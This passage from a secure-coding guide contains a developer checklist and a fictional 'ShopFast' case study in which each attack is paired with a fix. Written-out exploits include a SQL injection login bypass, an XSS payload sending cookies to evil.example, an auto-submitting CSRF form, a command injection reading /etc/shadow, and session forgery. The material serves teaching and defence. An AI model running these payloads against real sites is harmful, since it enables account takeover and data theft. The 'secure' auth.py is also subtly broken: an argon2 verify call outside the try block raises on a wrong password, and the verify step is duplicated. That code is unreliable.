Pinning caveats: have a **fallback/pin rotation plan** (pinning to a fixed leaf causes outages when you rotate certs); pin to a dedicated intermediate CA or use multiple pins. Block **user-supplied CA certs** via `network_security_config.xml` (`trust-anchors` + `cleartextTrafficPermitted="false"`).

- Enforce TLS 1.2+; reject cleartext HTTP in the app.
- Use HTTPS-only base URLs; validate the server identity with the OS trust store *plus* pins.

---

## 11. Developer Security Checklist

### 11.1 General / SSDLC

- [ ] Threat model exists for the feature (STRIDE walkthrough documented).
- [ ] Security requirements are written as testable acceptance criteria.
- [ ] CI runs: secret scan → SCA → SAST → unit/integration → container scan → IaC scan.
- [ ] No secrets in code, git history, or CI logs; secrets come from a vault at runtime.
- [ ] Dependencies pinned with lockfiles + hashes; critical CVEs patched within SLA.
- [ ] Every release is signed, has an SBOM, and is deployed from an immutable artifact.

### 11.2 Input & Output

- [ ] Every input is validated server-side (type, length, format, range).
- [ ] Every output is encoded for its context (HTML/attr/JS/URL).
- [ ] No `eval`, `exec`, `innerHTML`, `document.write` with user data.
- [ ] Uploads: extension + magic-byte allowlist, opaque names, outside webroot, no script execution.
- [ ] Deserialization only of trusted data; class allowlists; prefer JSON.
- [ ] File paths canonicalized; traversal rejected; no direct user control of paths.

### 11.3 Data & Crypto

- [ ] Passwords hashed with Argon2id/bcrypt/scrypt + salt.
- [ ] TLS 1.2+ everywhere; HSTS preloaded; no cleartext traffic.
- [ ] Sensitive data encrypted at rest with KMS-managed keys (never hardcoded).
- [ ] Credit card / PII minimization; no unnecessary collection or storage.
- [ ] Session tokens: CSPRNG, HttpOnly+Secure+SameSite, rotated on login, server-side store.

### 11.4 Authentication & Authorization

- [ ] MFA for privileged accounts; MFA encouraged for all.
- [ ] Rate limiting + progressive lockout on login/password-reset/payment.
- [ ] Generic error messages (no user enumeration).
- [ ] Every endpoint checks authorization (object *and* function level) — no IDOR/BOLA/BOPLA.
- [ ] Password reset uses short-lived single-use tokens and invalidates old sessions.
- [ ] JWT: pinned algorithm, short TTL, iss/aud/exp validated; keys rotated.

### 11.5 Application / Framework Config

- [ ] Security headers present and verified (see §6).
- [ ] Debug mode off; generic error pages; errors logged, not displayed.
- [ ] Default accounts removed; default passwords changed; credentials rotated.
- [ ] WAF (OWASP CRS) in blocking mode with tested rules; detection-only first.
- [ ] Server banner/version hidden; directory listing off.
- [ ] CORS configured narrowly (explicit origin allowlist), no `Access-Control-Allow-Origin: *` with credentials.

### 11.6 Logging & Monitoring

- [ ] Auth failures/successes, authz denials, input rejections, admin actions logged with correlation ID.
- [ ] Logs contain no secrets/PII-in-cleartext; redaction in place.
- [ ] SIEM alerts on brute force, anomalous access, and privilege changes.
- [ ] Incident response runbook exists and was drilled.

### 11.7 Before Merge / Release

- [ ] Security-focused code review done (not just functionality).
- [ ] DAST (ZAP/Burp) run against staging; findings triaged.
- [ ] Pen-test findings from prior release closed.
- [ ] Rollback plan exists; release runbook includes security checks.
- [ ] Third-party changes (new deps, config, infra) are in the security review scope.

---

## 12. Mock Case Study: "ShopFast" — From Attack to Secure Rewrite

**Setting:** `ShopFast`, a fictional e-commerce site at `https://shopfast.example`. Runs on Flask + SQLite behind nginx. User "alice" is a normal shopper; "admin" is the site owner. The developer, Dave, ships features fast and rarely reviews security.

### 12.1 Reconnaissance

Attacker (let's call them "Mallory") starts with passive recon and scanner output:

```bash
$ curl -sI https://shopfast.example
HTTP/1.1 200 OK
Server: nginx/1.14.0                     # version disclosed
X-Powered-By: Flask                       # framework disclosed
Set-Cookie: session=...; Path=/          # NO HttpOnly, NO Secure, NO SameSite

$ ffuf -u https://shopfast.example/FUZZ -w /tmp/common.txt -mc 200,301,401
admin/                      [301]
api/                        [200]
uploads/                    [200]         # directory listing ON
backups/                    [403]
```

`uploads/` shows a directory listing. The app reflects `q` on `/search` unfiltered (DAST/ZAP flagged reflected XSS). Let's find real bugs.

### 12.2 Vulnerability 1 — SQL Injection on Login (A03)

`src/auth.py`:

```python
@app.route("/login", methods=["POST"])
def login():
    username = request.form["username"]
    password = request.form["password"]
    row = db.execute(
        f"SELECT * FROM users WHERE username='{username}' AND password='{password}'"
    ).fetchone()
    if row:
        session["user_id"] = row["id"]
        return redirect("/account")
    return render_template("login.html", error="Invalid login")
```

**Exploit:**

```bash
curl -s -X POST https://shopfast.example/login \
     -d "username=admin'--&password=x" -i
```

Response: `302 Found` + `Set-Cookie: session=...` → Mallory is logged in as `admin`.

**Fix:**

```python
row = db.execute(
    "SELECT * FROM users WHERE username=? AND password_hash=?",
    username, hash_pw(password),
).fetchone()
```

### 12.3 Vulnerability 2 — IDOR on Order History (A01)

`src/orders.py`:

```python
@app.route("/orders/<order_id>")
@login_required
def order_detail(order_id):
    order = db.execute("SELECT * FROM orders WHERE id=?", order_id).fetchone()
    return render_template("order.html", order=order)   # no ownership check
```

**Exploit:**

```bash
# alice fetches her own order 100
curl -s -b "session=ALICE" https://shopfast.example/orders/100

# then tries bob's
curl -s -b "session=ALICE" https://shopfast.example/orders/101
```

Returns Bob's full order including name, address, and card last-4 digits.

**Fix:**

```python
order = db.execute(
    "SELECT * FROM orders WHERE id=? AND user_id=?",
    order_id, session["user_id"],
).fetchone()
if order is None:
    abort(404)      # same 404 for "not yours" as "doesn't exist"
```

### 12.4 Vulnerability 3 — Stored XSS in Product Reviews (A03)

`src/reviews.py`:

```python
@app.route("/product/<int:pid>/review", methods=["POST"])
def add_review(pid):
    body = request.form["review"]
    db.execute("INSERT INTO reviews (product_id, body) VALUES (?,?)", pid, body)
    return redirect(f"/product/{pid}")
```

`templates/product.html` uses `{{ review.body | safe }}` — a developer "fixed" escaping once and applied `safe` everywhere.

**Exploit (payload):**

```html
<img src=x onerror="fetch('https://evil.example/steal?c='+document.cookie)">
```

Every visitor to that product page sends their session cookie to Mallory (cookie lacks `HttpOnly`).

**Fix:** remove `| safe` (Jinja autoescape handles the rest); set `HttpOnly; Secure; SameSite=Lax` on the session cookie:

```python
app.config.update(
    SESSION_COOKIE_HTTPONLY=True,
    SESSION_COOKIE_SECURE=True,
    SESSION_COOKIE_SAMESITE="Lax",
)
```

Plus CSP: `Content-Security-Policy: script-src 'self'; object-src 'none'`.

### 12.5 Vulnerability 4 — No CSRF Protection on Payments (A01/A03)

`src/payments.py`:

```python
@app.route("/checkout", methods=["POST"])
@login_required
def checkout():
    amount = int(request.form["amount"])
    card = request.form["card_token"]
    charge(amount, card)          # no CSRF token check
```

**Exploit (attacker's page):**

```html
<form action="https://shopfast.example/checkout" method="POST">
  <input type="hidden" name="amount" value="9999">
  <input type="hidden" name="card_token" value="tok_alice_visa">
</form>
<script>document.forms[0].submit()</script>
```

Alice's browser auto-submits with her cookie → she is charged $99.99.

**Fix:** add CSRF token (see §3.2), enforce `SameSite=Lax` on cookies, and re-verify the `Origin` header server-side.

### 12.6 Vulnerability 5 — Command Injection in a Support Tool (A03)

`src/tools.py`:

```python
@app.route("/admin/ping", methods=["POST"])
@admin_required
def admin_ping():
    host = request.form["host"]
    out = subprocess.run(f"ping -c 3 {host}", shell=True, capture_output=True).stdout
    return f"<pre>{out}</pre>"
```

**Exploit (Mallory is admin now via §12.2, or uses a stored-XSS admin session):**

```bash
curl -X POST https://shopfast.example/admin/ping -d "host=1.1.1.1;cat /etc/shadow"
```

**Fix:** `subprocess.run(["ping","-c","3",host])` (argv, no shell) + allowlist `^[\w.\-]+$`.

### 12.7 Vulnerability 6 — Hardcoded Secret & Leaky Backup (A02/A05)

`src/config.py`:

```python
SECRET_KEY = "change-me-shopfast-2020"        # hardcoded, weak, committed
```

And a public S3 bucket `shopfast-backups` contains `db-dump-2026-01-01.sql.gz`.

**Exploit:** Mallory (now knowing `SECRET_KEY`) forges sessions for *any* user, including admin, without the password:

```python
# Mallory's laptop
import itsdangerous
s = itsdangerous.URLSafeTimedSerializer("change-me-shopfast-2020", salt="cookie-session")
print(s.dumps({"user_id": 1}))     # admin session cookie
```

And she pulls the whole database dump from the bucket.

**Fix:** rotate `SECRET_KEY` to a 64-byte value from the environment/KMS; block public bucket access with `BlockPublicAccess`; audit + rotate all production secrets.

### 12.8 The Secure Rewrite

After the incident, Dave rewrites the app with the fixes applied. Full patched `auth.py`:

```python
# src/auth.py — SECURE REWRITE
import re, secrets, argon2
from flask import Blueprint, request, session, redirect, g, abort, render_template

auth = Blueprint("auth", __name__)
hasher = argon2.PasswordHasher()

USERNAME_RE = re.compile(r"^[A-Za-z0-9_]{3,32}$")

@auth.route("/login", methods=["POST"])
def login():
    username = request.form.get("username", "")
    password = request.form.get("password", "")

    if not USERNAME_RE.match(username) or len(password) < 12:
        abort(400)                                   # input validation

    if is_rate_limited(request.remote_addr, username):   # §4.6
        abort(429, "Too many attempts, try again later")

    row = db.execute(
        "SELECT id, password_hash FROM users WHERE username=?", username
    ).fetchone()

    if row is None or not hasher.verify(row["password_hash"], password):
        record_auth_failure(username, request.remote_addr)   # §2.9 logging
        return render_template("login.html", error="Invalid credentials")  # generic
    try:
        ok = hasher.verify(row["password_hash"], password)
    except argon2.exceptions.VerifyMismatchError:
        ok = False

    if not ok:
        record_auth_failure(username, request.remote_addr)
        return render_template("login.html", error="Invalid credentials")

    session.clear()
    session["user_id"] = row["id"]
    session.permanent = False
    session["csrf_token"] = secrets.token_urlsafe(32)
    record_auth_success(username, request.remote_addr)
    return redirect("/account")
```

Supporting config and headers (`src/app.py`):

```python
app.config.update(
    SECRET_KEY=os.environ["SHOPFAST_SECRET_KEY"],
    SESSION_COOKIE_HTTPONLY=True,
    SESSION_COOKIE_SECURE=True,
    SESSION_COOKIE_SAMESITE="Lax",
    MAX_CONTENT_LENGTH=5 * 1024 * 1024,
)

@app.after_request
def secure_headers(resp):
    resp.headers["Content-Security-Policy"] = (
        "default-src 'self'; script-src 'self'; object-src 'none'; "
        "frame-ancestors 'none'; base-uri 'self'; form-action 'self'"
    )
    resp.headers["X-Content-Type-Options"] = "nosniff"
    resp.headers["Referrer-Policy"] = "strict-origin-when-cross-origin"
    resp.headers["Permissions-Policy"] = "camera=(), microphone=(), geolocation=()"
    return resp
```

nginx config (fragment) for the rewrite:

```nginx
server_tokens off;
autoindex off;
add_header Strict-Transport-Security "max-age=31536000; includeSubDomains; preload" always;
location /media/ { alias /var/www/uploads/; location ~* \.php$ { deny all; } }
limit_req_zone $binary_remote_addr zone=login:10m rate=10r/m;
location /login { limit_req zone=login burst=10 nodelay; }
```

### 12.9 Regression Verification

```bash
# 1. SQLi attempt → 400/500 or generic error, no data leak
curl -s "https://shopfast.example/search?q=admin'--" | grep -c "Results for"

# 2. IDOR attempt with another user's id → 404
curl -s -b "session=ALICE" -o /dev/null -w "%{http_code}\n" \
     https://shopfast.example/orders/101      # expect 404

# 3. Stored XSS payload is rendered as text (encoded)
curl -s -b "session=ALICE" "https://shopfast.example/product/42" | grep -c "<script>"

# 4. CSRF token required — request without token → 403
curl -s -o /dev/null -w "%{http_code}\n" -X POST https://shopfast.example/checkout \
     -d "amount=1" -b "session=ALICE"          # expect 403

# 5. Headers present
curl -sI https://shopfast.example | grep -Ei "strict-transport|content-security|x-content-type"

# 6. CI gates pass
semgrep --config rules/ . && pip-audit -r requirements.txt
```

### 12.10 Lessons Learned

| Before | After |
|--------|-------|
| SQL built by string concatenation | Parameterized queries everywhere |
| No ownership checks on order endpoints | Object-level authz + UUIDs, deny-by-default |
| `\| safe` on review body | Autoescape + CSP; no unsafe rendering |
| No CSRF tokens, loose cookies | Tokens + SameSite + Origin checks |
| `shell=True` command execution | argv arrays + allowlists |
| Hardcoded `SECRET_KEY`, public bucket | Vault-managed secrets, BlockPublicAccess |
| No headers, version banners | Full header set, banners off |
| Nothing logged | Auth events logged + SIEM alerts |
| No automated security testing | CI: secret scan → SCA → SAST → container scan → DAST on staging |

The rewrite cut the app's attack surface dramatically, and the whole thing is enforced by CI gates so regressions fail the build instead of reaching production.

---

## Appendix A — Quick Reference: Common Attack → Primary Fix

| Attack | Primary fix |
|--------|-------------|
| SQL injection | Parameterized queries |
| XSS | Context-aware output encoding + CSP |
| CSRF | Anti-CSRF tokens + SameSite |
| IDOR/BOLA | Server-side ownership checks |
| SSRF | Destination allowlist + blocked internal ranges + metadata protection |
| Command injection | No shell / argv arrays + input allowlist |
| XXE | Disable DTD/external entities |
| Deserialization | Use JSON; class allowlists; no client-sent serialized objects |
| Mass assignment | Explicit field allowlists |
| Open redirect | Redirect allowlist |
| Clickjacking | `frame-ancestors 'none'` / `X-Frame-Options: DENY` |
| Path traversal | Canonicalize + base-dir prefix check |
| File upload RCE | Extension+magic-byte allowlist, opaque names, no execution |
| Credential stuffing | Rate limiting + MFA + breach screening |
| JWT forgery | Pin algorithm, strong key, short TTL |

## Appendix B — Recommended Tooling (open source focus)

| Category | Tools |
|----------|-------|
| SAST | semgrep, bandit, SonarQube, CodeQL, Brakeman (Rails), SpotBugs (Java) |
| DAST | OWASP ZAP, Burp Suite CE/Pro, w3af |
| SCA | OWASP Dependency-Check, pip-audit, npm audit, Trivy (container/fs) |
| Secret scanning | trufflehog, gitleaks, detect-secrets |
| IaC scanning | checkov, tfsec, kube-bench |
| WAF | ModSecurity + OWASP CRS, Cloudflare/edge WAF rules |
| Network/HTTPS | testssl.sh, sslscan, sslyze |
| Threat modeling | OWASP Threat Dragon, Microsoft Threat Modeling Tool |

---

> **Disclaimer:** This document is for authorized security education and defensive use only. Exploiting systems you do not own or without permission is illegal in most jurisdictions. Always test in controlled environments (lab VMs, your own staging) and with written authorization.
